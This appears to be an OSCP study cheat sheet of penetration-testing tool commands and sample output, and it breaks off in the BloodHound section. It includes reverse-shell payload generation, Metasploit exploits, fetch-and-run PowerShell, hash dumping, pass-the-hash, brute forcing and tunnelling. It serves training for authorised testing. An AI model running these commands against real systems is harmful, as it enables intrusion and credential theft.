# OSCP - Ultimate Tool Usage Guide

> **Complete reference for every tool mentioned - what it does, when to use it, commands, and what to look for in output**

---

## Table of Contents

1. [Reconnaissance & Scanning Tools](#1-reconnaissance--scanning-tools)
2. [Web Application Tools](#2-web-application-tools)
3. [Exploitation & Payload Tools](#3-exploitation--payload-tools)
4. [Privilege Escalation Tools](#4-privilege-escalation-tools)
5. [Password Cracking Tools](#5-password-cracking-tools)
6. [Lateral Movement & Pivoting Tools](#6-lateral-movement--pivoting-tools)
7. [Active Directory Tools](#7-active-directory-tools)
8. [File Transfer & Shell Tools](#8-file-transfer--shell-tools)
9. [Wireless & Network Tools](#9-wireless--network-tools)
10. [Automation & Scripting Tools](#10-automation--scripting-tools)
11. [Quick Reference Tool Matrix](#11-quick-reference-tool-matrix)

---

## 1. Reconnaissance & Scanning Tools

### 1.1 Nmap - Network Mapper

**What**: Network discovery and security scanning tool
**When**: ALWAYS first. Initial recon of every target.

**Basic Scenarios**:

**Scenario 1: Initial Fast Scan**
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA initial_scan 192.168.50.100
```
**What to look for**:
- Open ports and services
- Service versions (important for exploit matching)
- Operating system hints
- "Not shown: 989 closed tcp ports" - tells you how many were filtered/closed

**Scenario 2: Full Port Scan**
```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 192.168.50.100
```
**What to look for**:
- Unusual high-number ports (often where hidden services live)
- Multiple hosts in same subnet
- Any port that's open that wasn't in top 1000

**Scenario 3: UDP Scan**
```bash
nmap -v -sU -T4 -Pn --top-ports 100 192.168.50.100
```
**What to look for**:
- SNMP (161) - often misconfigured
- DNS (53) - zone transfer opportunity
- NTP (123) - potential amplification attacks

**Scenario 4: Vulnerability Scan**
```bash
nmap -v -sS -Pn --script vuln --script-args=unsafe=1 192.168.50.100
```
**What to look for**:
- Any line starting with `|` indicates a finding
- CVE numbers in output
- "VULNERABLE:" in script output

**Scenario 5: SMB Vulnerability Scan**
```bash
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 192.168.50.100
```
**What to look for**:
- `| smb-vuln-*:` - indicates vulnerability check results
- "VULNERABLE" next to SMB exploits
- EternalBlue, EternalRomance, SMBGhost findings

**Scenario 6: Discover Live Hosts**
```bash
nmap -sn 192.168.50.0/24
```
**What to look for**:
- `Host is up` - live hosts
- List of IPs for further scanning
- MAC addresses (VMware often has 00:50:56 prefix)

**Scenario 7: OS Detection**
```bash
nmap -O --osscan-guess 192.168.50.100
```
**What to look for**:
- "Aggressive OS guesses" - likely OS
- "OS CPE" - Common Platform Enumeration string
- TTL values (64 = Linux, 128 = Windows)

**Key Output Indicators**:
```
PORT     STATE    SERVICE    VERSION
80/tcp   open     http       Apache httpd 2.4.49
445/tcp  open     microsoft-ds?
3389/tcp open     ms-wbt-server
```

### 1.2 AutoRecon - Automated Reconnaissance

**What**: Runs multiple Nmap scans, service scans, and common enumeration scripts automatically
**When**: Initial phase - run in background while manually exploring other targets

```bash
autorecon -vv 192.168.50.100
autorecon -vv 192.168.50.0/24
```

**What to look for**:
- Directory structure: `~/scans/target/`
- `_tcp_nmap.txt` - full TCP scan results
- `_udp_nmap.txt` - UDP scan results
- `_web_*.txt` - web-specific enumeration
- `_smb_*.txt` - SMB enumeration
- `_notes.txt` - automatically generated notes

**Key Files Created**:
```
scans/
├── 192.168.50.100/
│   ├── __tcp_nmap.txt
│   ├── __udp_nmap.txt
│   ├── web/
│   │   ├── index.html
│   │   └── robots.txt
│   ├── smb/
│   │   └── enum4linux.txt
│   └── _notes.txt
```

### 1.3 Gobuster - Directory/File Brute Force

**What**: Brute forces web directories and files
**When**: When you find a web server with HTTP/HTTPS

**Scenario 1: Quick Directory Scan**
```bash
gobuster dir -e -u http://192.168.50.100 -w /usr/share/wordlists/dirb/common.txt -t 20
```
**What to look for**:
- Status 200 - accessible directory/file
- Status 301/302 - redirects (often to admin pages)
- Status 403 - forbidden (check permissions)
- Status 405 - method not allowed (API endpoints)

**Scenario 2: Slow, Thorough Scan with Extensions**
```bash
gobuster dir -e -u http://192.168.50.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx,jsp,do -t 20
```
**What to look for**:
- `config.php`, `wp-config.php`, `web.config` - config files
- `backup` files with .bak extension
- `admin`, `login`, `dashboard` - admin interfaces
- `api`, `v1`, `v2` - API endpoints

**Scenario 3: DNS Subdomain Brute Force**
```bash
gobuster dns -d domain.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```
**What to look for**:
- `Found: subdomain.domain.com` - live subdomains
- Internal subdomains (dev, test, staging, admin)

**Scenario 4: VHost Brute Force**
```bash
gobuster vhost -u http://192.168.50.100 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```
**What to look for**:
- Different responses for different Host headers
- Hidden vhosts with different content

**Key Output Indicators**:
```
Found: /admin (Status: 301)
Found: /login.php (Status: 200)
Found: /wp-admin (Status: 301)
Found: /backup (Status: 403)
```

### 1.4 Enum4Linux - SMB Enumeration

**What**: Enumerates SMB shares, users, groups, policies
**When**: When you find SMB port 139 or 445 open

**Scenario 1: Full Scan**
```bash
enum4linux 192.168.50.100
```
**What to look for**:
- `[+] Enumerating users using SID S-1-5-21-*` - valid domain users
- `[+] Share Enumeration` - accessible shares
- `[+] Password Policy` - lockout thresholds, complexity requirements
- `[+] Getting local groups` - group memberships

**Scenario 2: Specific Enumeration**
```bash
# Users
enum4linux -U 192.168.50.100

# Shares
enum4linux -S 192.168.50.100

# Groups
enum4linux -G 192.168.50.100

# Password policy
enum4linux -P 192.168.50.100

# OS information
enum4linux -o 192.168.50.100
```
**What to look for**:
- `username` in user list - potential credentials
- Share names - ADMIN$, C$, IPC$ (default), non-standard shares
- `Domain Admins` group membership
- `Lockout threshold: 5` - password spray limits

**Scenario 3: Suppress Errors**
```bash
enum4linux 192.168.50.100 | grep -Ev '^(Use of)' > enum4linux.out
```
**What to look for**:
- Clean output with no error noise
- Easier to grep for specific findings

**Key Output Indicators**:
```
[+] Share Enumeration on 192.168.50.100
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    share           Disk      Important documents

[+] Users:
    user1, user2, Administrator, Guest
```

### 1.5 SMBClient - SMB File Access

**What**: Connect to SMB shares like a Windows file browser
**When**: When you have SMB credentials or anonymous access

**Scenario 1: List Shares**
```bash
# As guest
smbclient -U guest -L 192.168.50.100

# As user
smbclient -U "John" -L 192.168.50.100
```
**What to look for**:
- Non-default shares (not ADMIN$, C$, IPC$)
- Shares with interesting names (backup, docs, users, data)

**Scenario 2: Connect to Share**
```bash
smbclient \\\\192.168.50.100\\share -U "John" -p "password"
```
**What to look for**:
- Files and folders in the share
- `ls` shows directory contents
- `get` to download files
- Alternate data streams with `allinfo`

**Scenario 3: Download All Files**
```bash
smbclient '\\192.168.50.100\share' -U "John" -c 'prompt OFF;recurse ON;cd "\path";lcd "/tmp";mget *'
```
**What to look for**:
- Downloaded files in /tmp/
- Look for config files, password files, SSH keys

**Scenario 4: Explore Alternate Data Streams**
```bash
# List streams
smbclient \\\\192.168.50.100\\share -U "John" -c 'allinfo "file.txt"'

# Download stream
get "file.txt:SECRET:$DATA"
```
**What to look for**:
- Hidden data in file streams
- Passwords, credentials in streams

**Key Output Indicators**:
```
Enter WORKGROUP\John's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 1 00:00:00 2024
  ..                                  D        0  Mon Jan 1 00:00:00 2024
  file.txt                            A       1024  Mon Jan 1 00:00:00 2024
```

### 1.6 Hydra - Brute Force Attack Tool

**What**: Performs dictionary attacks against network services
**When**: When you have usernames and need passwords, or vice versa

**Scenario 1: HTTP Basic Authentication**
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.50.100 http-get /admin/ -t 15
```
**What to look for**:
- `[80][http-get] host: 192.168.50.100   login: admin   password: found` - valid credentials
- `STATUS_LOGIN_FAILED` - invalid attempts

**Scenario 2: HTTP POST Login Form**
```bash
hydra -l admin -P rockyou.txt 192.168.50.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```
**What to look for**:
- Login page uses `username` and `password` parameters
- Failure message is "Invalid" - adjust if different
- Different response for valid vs invalid

**Scenario 3: SSH Brute Force**
```bash
hydra -l root -P rockyou.txt ssh://192.168.50.100 -t 4 -V
```
**What to look for**:
- `[22][ssh] host: 192.168.50.100   login: root   password: found`
- Slow attempts - adjust threads if getting blocked

**Scenario 4: RDP Brute Force**
```bash
hydra -L users.txt -P rockyou.txt rdp://192.168.50.100 -t 1 -V
```
**What to look for**:
- RDP is slow - use t=1 to avoid lockouts
- If password spray, use a single password with L

**Scenario 5: MySQL Brute Force**
```bash
hydra -L users.txt -P rockyou.txt -vv mysql://192.168.50.100:3306/mysql -t 15
```
**What to look for**:
- Database name after port (usually mysql)
- Valid credentials allow access to DB

**Key Output Indicators**:
```
[DATA] attacking http-post-form://192.168.50.100:80/login.php:username=^USER^&password=^PASS^:Invalid
[STATUS] 64.00 tries/min, 64 tries in 00:01h
[80][http-post-form] host: 192.168.50.100   login: admin   password: password123
```

### 1.7 SearchSploit - Offline Exploit Database

**What**: Search for public exploits offline
**When**: After you identify software and version numbers

**Scenario 1: Search for Exploit**
```bash
searchsploit apache 2.4.49
```
**What to look for**:
- Exploit title with matching version
- Path to exploit (e.g., `linux/local/12345.py`)
- Exploit type (local, remote, webapp)
- EDB-ID for reference

**Scenario 2: Search by Platform**
```bash
searchsploit windows remote smb
```
**What to look for**:
- Exploits for specific platform and type
- EDB Verified status (verified mark)
- Recent exploits vs old exploits

**Scenario 3: Copy Exploit**
```bash
searchsploit -m 50420
```
**What to look for**:
- `Copied to: /home/kali/50420.py`
- File is ready to modify and use

**Scenario 4: View Exploit Code**
```bash
searchsploit -x 50420
```
**What to look for**:
- Usage instructions in comments
- Required parameters
- Payload/shellcode (check for malicious code)

**Scenario 5: Search Without False Positives**
```bash
searchsploit -s Apache Struts 2.0.0
```
**What to look for**:
- Exact matches only
- No false positives

**Key Output Indicators**:
```
----------------------------------------------------------------------------
 Exploit Title                                      |  Path
----------------------------------------------------------------------------
Apache 2.4.49/2.4.50 - Path Traversal RCE           | linux/remote/50943.py
Apache 2.4.49 - Directory Traversal                 | linux/remote/50420.txt
```

### 1.8 DNSEnum - DNS Enumeration

**What**: Automated DNS recon and subdomain discovery
**When**: When you find DNS servers or need to discover subdomains

```bash
dnsenum domain.com --threads 100
```
**What to look for**:
- `Name Servers` - authoritative DNS servers
- `Mail (MX) Servers` - mail servers
- `Zone Transfer` - AXFR attempt (gold if it works)
- `Brute forcing` - found subdomains

**Key Output Indicators**:
```
Name Servers:
ns1.domain.com         192.168.1.1
ns2.domain.com         192.168.1.2

Mail (MX) Servers:
mail.domain.com        192.168.1.10

Brute forcing:
www.domain.com         192.168.1.100
mail.domain.com        192.168.1.10
admin.domain.com       192.168.1.200
```

---

## 2. Web Application Tools

### 2.1 WPScan - WordPress Vulnerability Scanner

**What**: Scans WordPress installations for vulnerabilities
**When**: When you find a WordPress site

**Scenario 1: Standard Scan**
```bash
wpscan --url http://192.168.50.100
```
**What to look for**:
- `WordPress version` - check for known vulnerabilities
- `Themes` - often vulnerable
- `Plugins` - the most likely attack vector
- `Users` - usernames for brute force

**Scenario 2: Aggressive Plugin Detection**
```bash
wpscan --url http://192.168.50.100 --enumerate p --plugins-detection aggressive
```
**What to look for**:
- `Plugin: example-plugin` - with version number
- Version numbers - check against known vulnerabilities
- `Status: vulnerable` - attack this!

**Scenario 3: User Enumeration**
```bash
wpscan --url http://192.168.50.100 --enumerate u
```
**What to look for**:
- Usernames found
- `admin` or `administrator` - common target
- Email addresses (can be used for phishing)

**Scenario 4: Password Attack**
```bash
wpscan --url http://192.168.50.100 --passwords /usr/share/wordlists/rockyou.txt
```
**What to look for**:
- `[SUCCESS]` - found valid credentials
- Login with found credentials

**Key Output Indicators**:
```
[+] WordPress version 5.9 identified (Insecure, released on 2022-02-22).
[+] Enumerating Most Popular Plugins
[+] Plugin: contact-form-7 v5.5.6 (latest)
[!] Title: Contact Form 7 < 5.5.6.1 - Unauthenticated File Upload
    Reference: https://wpscan.com/vulnerability/...
```

### 2.2 SQLMap - SQL Injection Automation

**⚠️ WARNING**: RESTRICTED in OSCP exam! Check current guidelines.

**What**: Automates SQL injection detection and exploitation
**When**: When you suspect SQL injection (but if banned, do manually)

**Scenario 1: Basic GET Request**
```bash
sqlmap -u "http://192.168.50.100/page.php?id=1" --batch
```
**What to look for**:
- `Parameter: id (GET)` - vulnerable parameter
- `(MySQL)` - database type
- `current user: 'root'@'localhost'` - DB user

**Scenario 2: Aggressive Test**
```bash
sqlmap -u "http://192.168.50.100/page.php?id=1" --batch --level=5 --risk=3
```
**What to look for**:
- More injection points
- Time-based blind findings
- More database information

**Scenario 3: POST Request**
```bash
sqlmap -r post_request.txt --batch
```
**What to look for**:
- All parameters tested
- Which parameter is vulnerable

**Scenario 4: Dump Database**
```bash
sqlmap -r post_request.txt --dump --batch
```
**What to look for**:
- `Database: database_name` - tables listed
- `Table: users` - columns and data
- Credentials, hashes, personal data

**Scenario 5: OS Shell**
```bash
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```
**What to look for**:
- `Could not find a writable directory` - try other paths
- `uploaded successfully` - shell uploaded
- Interactive shell prompt

**Key Output Indicators**:
```
Parameter: id (GET) is vulnerable
Type: boolean-based blind
Type: error-based
Type: time-based blind

Database: wordpress
Table: wp_users
+----+----------+------------------------------------+
| ID | username | password                           |
+----+----------+------------------------------------+
| 1  | admin    | $P$B...                           |
+----+----------+------------------------------------+
```

### 2.3 Nikto - Web Server Scanner

**What**: Scans web servers for misconfigurations and vulnerabilities
**When**: Initial web server enumeration

```bash
nikto -h http://192.168.50.100
```
**What to look for**:
- `Server: Apache/2.4.49` - version info
- `"/admin": Admin login page found` - potential entry
- `"robots.txt" contains disallowed entries` - hidden paths
- `"PHP/7.4"` - technology stack

**Key Output Indicators**:
```
- /admin/                   : Admin login page found.
- /phpinfo.php              : Output from phpinfo() found.
- /cgi-bin/test.cgi         : CGI script found.
- /robots.txt               : Contains disallowed entries.
```

### 2.4 Feroxbuster - Web Directory Brute Force

**What**: Similar to Gobuster but written in Rust, very fast
**When**: When Gobuster is slow or you need faster scans

```bash
feroxbuster -u http://192.168.50.100 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
**What to look for**:
- Same as Gobuster output
- Faster scanning
- Recursive directory discovery

### 2.5 Ffuf - Fuzzing Tool

**What**: Web fuzzing for directories, files, parameters
**When**: You need to fuzz web applications

```bash
# Directory fuzzing
ffuf -u http://192.168.50.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Parameter fuzzing
ffuf -u http://192.168.50.100/page.php?FUZZ=test -w /usr/share/wordlists/param.txt

# POST data fuzzing
ffuf -u http://192.168.50.100/login.php -X POST -d "username=admin&password=FUZZ" -w rockyou.txt
```
**What to look for**:
- Different response codes and sizes
- `size: 0` - interesting findings
- `redirect` - potential SSRF

**Key Output Indicators**:
```
[Status: 200] | Size: 12345 | Word: admin
[Status: 302] | Size: 0     | Word: login
```

---

## 3. Exploitation & Payload Tools

### 3.1 MSFVenom - Payload Generator

**What**: Generate various payloads for different platforms
**When**: You need a custom payload for exploitation

**Scenario 1: Windows Reverse Shell**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f exe -o shell.exe
```
**What to look for**:
- `Payload size: 460 bytes` - payload size
- `Final size of exe file: 7168 bytes` - file size
- `Saved as: shell.exe` - output file

**Scenario 2: Windows Meterpreter**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f exe -o met.exe
```
**What to look for**:
- Non-staged payload (no slash in name)
- Larger size - more features

**Scenario 3: Linux Reverse Shell**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f elf -o shell.elf
```
**What to look for**:
- ELF format for Linux
- `chmod +x shell.elf` before running

**Scenario 4: Web Shells**
```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f raw -o shell.jsp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.5 LPORT=4444 -f aspx -o shell.aspx
```

**Scenario 5: Bad Character Filtering**
```bash
msfvenom -p windows/shell_bind_tcp LHOST=192.168.50.5 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86
```
**What to look for**:
- `-b` - bad characters to avoid
- `-f c` - C-style output for shellcode
- `-a x86` - architecture

**Key Output Indicators**:
```
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

### 3.2 Metasploit Framework (MSF)

**What**: Full exploit framework with payloads, exploits, and post-exploitation
**When**: When you have a vulnerability and need an exploit or handler

**Scenario 1: Multi/Handler (Listener)**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 192.168.50.5
set LPORT 4444
set ExitOnSession false
run -j
```
**What to look for**:
- `Started reverse TCP handler` - listener active
- `Meterpreter session X opened` - successful connection
- `idle` sessions in `sessions -l`

**Scenario 2: SMB Exploit**
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.50.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.50.5
run
```
**What to look for**:
- `The target is vulnerable` - confirm vulnerability
- `Exploit completed` - successful
- Session opened

**Scenario 3: Web Exploit**
```bash
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 192.168.50.100
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.50.5
run
```
**What to look for**:
- `[+] The target is vulnerable to CVE-2021-42013` - vulnerable
- `Command shell session X opened` - shell obtained

**Scenario 4: Post-Exploitation**
```bash
sessions -i 1
getuid
sysinfo
ps
migrate 1234
```
**What to look for**:
- `Server username: SYSTEM` - high privileges
- Process list for migration targets
- Migrate to stable process

### 3.3 Social Engineering Toolkit (SET)

**What**: Social engineering attacks toolkit
**When**: For phishing or client-side attacks

```bash
setoolkit
```
**What to look for**:
- Menus for different attack vectors
- Credential harvester options
- Spear phishing options

---

## 4. Privilege Escalation Tools

### 4.1 LinPEAS - Linux Privilege Escalation

**What**: Automated Linux privilege escalation enumeration
**When**: After gaining initial Linux foothold

**Scenario 1: Basic Run**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
**What to look for** (color-coded):
- 🔴 **Red** - Misconfigurations, interesting findings
- 🟢 **Green** - Protected, good config
- 🟡 **Yellow** - Links or symbolic links
- `╔══════════╣` - Section headers

**Key Sections to Review**:
- `╔══════════╣ SUID` - SUID binaries
- `╔══════════╣ Sudo` - sudo permissions
- `╔══════════╣ Cron` - scheduled tasks
- `╔══════════╣ Capabilities` - Linux capabilities
- `╔══════════╣ Users` - user enumeration

**Scenario 2: Quick Run**
```bash
./linpeas.sh -a
```
**What to look for**:
- All checks enabled
- More verbose output

**Key Output Indicators**:
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 12345 /usr/bin/passwd
-rwsr-xr-x 1 root root 12345 /usr/bin/sudo
-rwsr-xr-x 1 root root 12345 /usr/bin/find        <--- VULNERABLE!
```

### 4.2 WinPEAS - Windows Privilege Escalation

**What**: Automated Windows privilege escalation enumeration
**When**: After gaining initial Windows foothold

```powershell
iwr -uri http://192.168.50.5/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```
**What to look for** (color-coded):
- 🔴 **Red** - Interesting findings
- 🟢 **Green** - Protected
- `[X]` - Missing protections

**Key Sections to Review**:
- `Basic System Information` - OS version, patches
- `Privileges` - user privileges
- `Services` - writable service binaries
- `Scheduled Tasks` - writable tasks
- `Applications` - installed software

**Key Output Indicators**:
```
[*] Services Information
  Service Name: Mysql
  Path: C:\xampp\mysql\bin\mysqld.exe
  Permissions: BUILTIN\Users has Full Control  <--- VULNERABLE!
```

### 4.3 PowerUp - PowerShell Privilege Escalation

**What**: PowerShell-based privilege escalation enumeration
**When**: Windows target with PowerShell access

```powershell
# Download
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Import
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks
```
**What to look for**:
- `AbuseFunction` - specific command to exploit
- `CanRestart` - can you restart the service?
- `ModifiableFile` - writable file path

**Key Output Indicators**:
```
ServiceName    : mysql
Path           : C:\xampp\mysql\bin\mysqld.exe
ModifiableFile : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes...}
AbuseFunction  : Install-ServiceBinary -Name 'mysql'
CanRestart     : False
```

### 4.4 Linux Smart Enumeration (LSE)

**What**: Linux privilege escalation enumeration
**When**: When LinPEAS is detected or you need a lighter tool

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh
```
**What to look for**:
- Colors for severity
- `[+]` - interesting findings
- `[!]` - critical findings

---

## 5. Password Cracking Tools

### 5.1 Hashcat - GPU Password Cracker

**What**: Fast password cracking using GPU
**When**: After you capture hashes

**Scenario 1: NTLM Hash Cracking**
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```
**What to look for**:
- `Session..........: hashcat` - status
- `Status...........: Running` or `Cracked`
- `Speed.#1.........: 12345 MH/s` - hash rate
- `Recovered........: 1/1 (100%)` - cracked

**Scenario 2: NetNTLMv2 Cracking**
```bash
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
**What to look for**:
- Mode 5600 for NetNTLMv2
- Rules help crack variations

**Scenario 3: Kerberoast (TGS-REP)**
```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force
```
**What to look for**:
- Mode 13100 for TGS-REP
- Service account password cracked

**Scenario 4: AS-REP Roast**
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
```
**What to look for**:
- Mode 18200 for AS-REP
- No Kerberos preauth required

**Key Output Indicators**:
```
$hash$:password     ← Cracked hash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: hash_value
Time.Started.....: 2024-01-01 00:00:00
Time.Estimated...: 2024-01-01 00:00:00
Speed.#1.........: 12345 MH/s
Recovered........: 1/1 (100%)
```

### 5.2 John the Ripper - CPU Password Cracker

**What**: Password cracking on CPU
**When**: Hashcat isn't available, or for specific hash formats

**Scenario 1: Basic Cracking**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
**What to look for**:
- `Loaded X password hashes` - hash count
- `Press 'q' or Ctrl-C to abort` - running
- `0g 0:00:00:00` - progress

**Scenario 2: With Rules**
```bash
john --wordlist=rockyou.txt --rules hash.txt
```
**What to look for**:
- More attempts = more cracking
- Rule variations produce more passwords

**Scenario 3: Format Conversion**
```bash
ssh2john id_rsa > ssh.hash
keepass2john database.kdbx > keepass.hash
zip2john archive.zip > zip.hash
```
**What to look for**:
- Conversion success
- Hash file created

**Scenario 4: Show Cracked**
```bash
john --show hash.txt
```
**What to look for**:
- List of cracked passwords
- `0 password hashes left to crack` - complete

**Key Output Indicators**:
```
password123     (username)
Loaded 1 password hash (MD5)
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE
```

### 5.3 HashID / Hash-Identifier

**What**: Identify hash types
**When**: You have a hash and don't know the format

```bash
hashid "$P$B..."
hash-identifier
```

**What to look for**:
- `MD5` - mode 0
- `NTLM` - mode 1000
- `SHA1` - mode 100
- `bcrypt` - mode 3200
- `WordPress` - starts with $P$B

**Key Output Indicators**:
```
Analyzing: $P$B...
[+] WordPress (MD5)
[+] PHPass (Portable)
```

---

## 6. Lateral Movement & Pivoting Tools

### 6.1 CrackMapExec - Network Post-Exploitation

**What**: Post-exploitation tool for Windows/AD environments
**When**: After getting credentials, for lateral movement

**Scenario 1: Password Spraying**
```bash
crackmapexec smb 192.168.50.0/24 -u users.txt -p passwords.txt --continue-on-success
```
**What to look for**:
- `[+]` - valid credentials
- `(Pwn3d!)` - local admin privileges
- `STATUS_LOGON_FAILURE` - invalid

**Scenario 2: Check Local Admin**
```bash
crackmapexec smb 192.168.50.100 -u user -p password --local-auth
```
**What to look for**:
- `(Pwn3d!)` - user is local admin
- No `(Pwn3d!)` - not admin

**Scenario 3: List Shares**
```bash
crackmapexec smb 192.168.50.100 -u user -p password --shares
```
**What to look for**:
- Shares with READ/WRITE permissions
- Non-standard shares

**Scenario 4: Execute Commands**
```bash
crackmapexec smb 192.168.50.100 -u user -p password -x whoami
```
**What to look for**:
- Command output
- `nt authority\system` - high privilege

**Scenario 5: Pass the Hash**
```bash
crackmapexec smb 192.168.50.100 -u user -H NTLM_HASH
```
**What to look for**:
- `[+]` - PtH successful
- `(Pwn3d!)` - admin access

**Key Output Indicators**:
```
SMB         192.168.50.100  445    TARGET          [*] Windows 10.0 Build 20348 x64 (name:TARGET) (domain:domain.com) (signing:False) (SMBv1:False)
SMB         192.168.50.100  445    TARGET          [+] domain.com\user:password (Pwn3d!)
SMB         192.168.50.100  445    TARGET          [+] Enumerated shares
SMB         192.168.50.100  445    TARGET          Share           Permissions     Remark
SMB         192.168.50.100  445    TARGET          -----           -----------     ------
SMB         192.168.50.100  445    TARGET          ADMIN$                          Remote Admin
SMB         192.168.50.100  445    TARGET          C$                              Default share
SMB         192.168.50.100  445    TARGET          IPC$            READ            Remote IPC
SMB         192.168.50.100  445    TARGET          share           READ            Important docs
```

### 6.2 Impacket - Python Network Tools

**What**: Collection of Python scripts for network protocols
**When**: Lateral movement, pass-the-hash, SMB enumeration

**Scenario 1: psexec - Execute Commands**
```bash
impacket-psexec domain/user:password@192.168.50.100
impacket-psexec -hashes :NTLM_HASH domain/user@192.168.50.100
```
**What to look for**:
- `Service started` - successful
- Interactive shell
- Command output

**Scenario 2: wmiexec - WMI Command Execution**
```bash
impacket-wmiexec domain/user:password@192.168.50.100
```
**What to look for**:
- Shell access
- Runs as user

**Scenario 3: secretsdump - Dump Hashes**
```bash
impacket-secretsdump domain/user:password@192.168.50.100
```
**What to look for**:
- NTLM hashes
- Kerberos keys
- SAM/LSA secrets

**Scenario 4: smbclient - SMB File Access**
```bash
impacket-smbclient domain/user:password@192.168.50.100
```
**What to look for**:
- File browser
- Download/upload files

**Scenario 5: GetUserSPNs - Kerberoasting**
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.50.10 domain/user:password
```
**What to look for**:
- SPN accounts listed
- TGS-REP hash for cracking

**Key Output Indicators**:
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.50.100.....
[*] Found writable share ADMIN$
[*] Uploading file XXXXX.exe
[*] Opening SVCManager on 192.168.50.100.....
[*] Creating service XXXXX on 192.168.50.100.....
[*] Starting service XXXXX.....
[!] Press help for extra shell commands
C:\Windows\system32>
```

### 6.3 PsExec - Windows Remote Execution

**What**: Lightweight Windows remote execution tool
**When**: When you need to execute commands on Windows

```bash
# From Windows
PsExec64.exe \\192.168.50.100 -u domain\user -p password cmd

# From Kali (impacket version)
impacket-psexec domain/user:password@192.168.50.100
```
**What to look for**:
- `cmd` prompt
- `whoami` to confirm user
- `hostname` to confirm target

### 6.4 Evil-WinRM - Windows Remote Management

**What**: WinRM shell for Windows
**When**: When WinRM port 5985/5986 is open

```bash
evil-winrm -i 192.168.50.100 -u user -p password
evil-winrm -i 192.168.50.100 -u user -H NTLM_HASH
```
**What to look for**:
- `Evil-WinRM shell` - connected
- PowerShell prompt
- File upload/download with `upload`/`download`

**Key Output Indicators**:
```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\user\Documents>
```

### 6.5 Chisel - HTTP Tunneling

**What**: HTTP tunnel for pivoting through firewalls
**When**: When only HTTP traffic is allowed out

**Scenario 1: Server (Kali)**
```bash
./chisel server --port 8080 --reverse
```
**What to look for**:
- `Listening on http://0.0.0.0:8080` - server ready
- `Reverse tunnelling enabled` - accepts reverse

**Scenario 2: Client (Victim) - Reverse SOCKS**
```bash
./chisel client 192.168.50.5:8080 R:socks
```
**What to look for**:
- `Connected` - tunnel established
- `SOCKS proxy` - ready to use

**Scenario 3: Port Forwarding**
```bash
# Client connects and forwards port 80 on target to Kali:8080
./chisel client 192.168.50.5:8080 R:8080:172.16.0.10:80
```
**What to look for**:
- `Forwarding remote port 8080` - active tunnel
- Access internal service on Kali:8080

---

## 7. Active Directory Tools

### 7.1 BloodHound - AD Attack Path Mapping

**What**: Visualizes AD attack paths
**When**: After getting domain credentials

**Scenario 1: Data Collection (SharpHound)**
```powershell
# PowerShell collector
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# SharpHound.exe
SharpHound.exe -c All -d domain.com
```
**What to look for**:
- `Enumeration finished` - collection complete
- `BloodHound.zip` - output file

**Scenario 2: Import to BloodHound**
```bash
# Start Neo4j
sudo neo4j start

# Start BloodHound
bloodhound

